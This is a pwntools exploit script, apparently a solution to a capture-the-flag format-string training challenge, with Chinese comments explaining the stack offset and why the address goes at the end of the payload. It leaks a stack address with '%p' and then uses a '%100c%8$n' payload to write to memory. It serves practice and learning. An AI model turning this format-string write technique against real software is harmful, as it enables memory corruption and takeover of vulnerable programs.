from pwn import *

# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/fmt-str-level1.1"
p = process(challenge_path)

payload=b"%p"
p.sendlineafter("input:\n",payload)
result = p.recvline()
rsp_addr=int(result,16)
print("rsp ADDR IS:",hex(rsp_addr))
#填充操作共9个字节，补全为16个字节，那么目标地址的偏移量是6+16/8=8
payload2=b"%100c%8$n"+7*p8(0x11)+p64(rsp_addr+0x10c)
p.sendlineafter("input:\n",payload2)
print(p.recvline())
# printf栈顶是原rsp，第6个参数是字符串，可以通过字符串写入目标地址，然后用参数偏移赋值
# 但是要注意由于printf解析的是字符串，地址放在一开始会导致末位0截断，所以需要将地址放在后面！！！而且不能影响前面的填充

# python3 /home/hacker/fmt1.py